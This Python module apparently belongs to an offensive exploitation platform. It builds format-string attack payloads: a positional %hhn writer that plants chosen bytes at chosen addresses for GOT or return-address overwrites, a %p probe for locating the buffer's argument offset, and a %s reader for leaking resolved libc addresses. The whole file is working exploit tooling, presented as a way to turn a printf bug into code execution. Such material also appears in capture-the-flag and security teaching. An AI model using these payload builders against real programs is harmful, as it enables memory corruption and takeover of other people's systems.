"""Format-string exploitation: turn a `printf(user)` sink into a write-what-where primitive.

The platform already LEAKS with a format string (`%p` provocation in leak.py); this adds the WRITE
side -- a positional `%hhn` payload that plants arbitrary bytes at arbitrary addresses -- plus the
recon to find where the controlled buffer lands in printf's varargs, so a format bug can be driven
to a GOT/return overwrite and an L3, not just a disclosure.

Byte-at-a-time (`%hhn`) is used throughout: it keeps the advance counts tiny (<256) and sidesteps
the huge `%<width>c` fields whole-word `%n` would need. Positional args (`%k$hhn`) let the address
table sit AFTER the format string regardless of how many writes there are.
"""
from __future__ import annotations

import re
import struct


def _byte_writes(writes, word):
    """Expand {addr: value} into an ordered list of (addr, byte) single-byte writes covering each
    value's significant bytes (capped at `word`)."""
    out = {}
    for addr, val in writes.items():
        val &= (1 << (8 * word)) - 1
        n = max(1, (val.bit_length() + 7) // 8)
        for i in range(n):
            out[addr + i] = (val >> (8 * i)) & 0xFF
    return out


def fmtstr_payload(arg_offset: int, writes: dict, *, written: int = 0, word: int = 8,
                   endian: str = "little") -> bytes:
    """A format string that performs the {addr: value} memory writes via `%hhn`.

    `arg_offset` is the 1-based printf argument index at which the START of the format buffer lands
    on the stack (recover it with `find_fmt_offset`). `written` is the count printf has already
    emitted before this payload (e.g. a fixed prefix). Returns: the format directives, NUL-padded to
    a `word` boundary, followed by the packed target addresses -- the `%k$hhn` directives index
    those trailing addresses by absolute stack position."""
    bw = sorted(_byte_writes(writes, word).items(), key=lambda kv: kv[1])
    pk = ("<" if endian == "little" else ">") + ("Q" if word == 8 else "I")
    # Fixed point: the format's length sets where the address table begins (its stack index), whose
    # digit count feeds back into the format's length. Iterate until the table position is stable.
    table_words = len(bw)
    for _ in range(8):
        first_idx = arg_offset + table_words
        fmt = bytearray()
        prev = written & 0xFF
        for j, (_addr, b) in enumerate(bw):
            delta = (b - prev) & 0xFF
            if delta:
                fmt += f"%{delta}c".encode()
            fmt += f"%{first_idx + j}$hhn".encode()
            prev = b
        pad = (-len(fmt)) % word
        new_words = (len(fmt) + pad) // word
        if new_words == table_words:
            fmt += b"\x00" * pad
            return bytes(fmt) + b"".join(struct.pack(pk, a & ((1 << (8 * word)) - 1)) for a, _ in bw)
        table_words = new_words
    raise ValueError("fmtstr_payload did not converge")


_HEXWORD = re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")


def find_fmt_offset(probe_out: bytes, marker: int = 0x4141414141414141, word: int = 8):
    """Given the output of feeding `MARKER + "%p %p %p..."` to a format-string sink, return the
    1-based argument index whose printed value equals the marker -- i.e. where the format buffer's
    first word lands in printf's varargs. None if the marker is not seen (sink not reached, or the
    marker not on the stack). Callers align the marker to a word so it appears verbatim."""
    words = _HEXWORD.findall(probe_out)
    lo = marker & 0xFFFFFFFF if word == 8 else marker & 0xFFFFFFFF
    for i, w in enumerate(words):
        if w == b"(nil)":
            continue
        try:
            v = int(w, 16)
        except ValueError:
            continue
        if v == marker or (word == 4 and v == lo):
            return i + 1
    return None


def probe_payload(count: int = 20, marker: bytes = b"AAAAAAAA", word: int = 8) -> bytes:
    """A recon payload: a word-aligned marker followed by `count` positional `%p` reads, so the
    output can be scanned (with find_fmt_offset) for where the marker lands."""
    marker = marker[:word].ljust(word, b"A")
    body = b" ".join(f"%{i}$p".encode() for i in range(1, count + 1))
    return marker + b"|" + body + b"\n"


def read_at_payload(arg_offset: int, addr: int, *, word: int = 8, pad: int = 16) -> bytes:
    """A format payload that leaks the string at `addr` via a positional `%K$s`. The directive is
    padded to `pad` (a word multiple) bytes so the address that follows sits at a KNOWN varargs slot
    -- K = arg_offset + pad/word -- which makes the leak DETERMINISTIC (no %p-dump classification,
    which needs several corroborating symbol pointers a stack dump rarely has). printf prints the
    dereferenced string FIRST, so the leaked bytes lead the output. Used to read a GOT slot's
    resolved libc address and recover the base."""
    slot = arg_offset + pad // word
    directive = ("%%%d$s" % slot).encode().ljust(pad, b".")
    return directive + struct.pack("<Q" if word == 8 else "<I", addr) + b"\n"
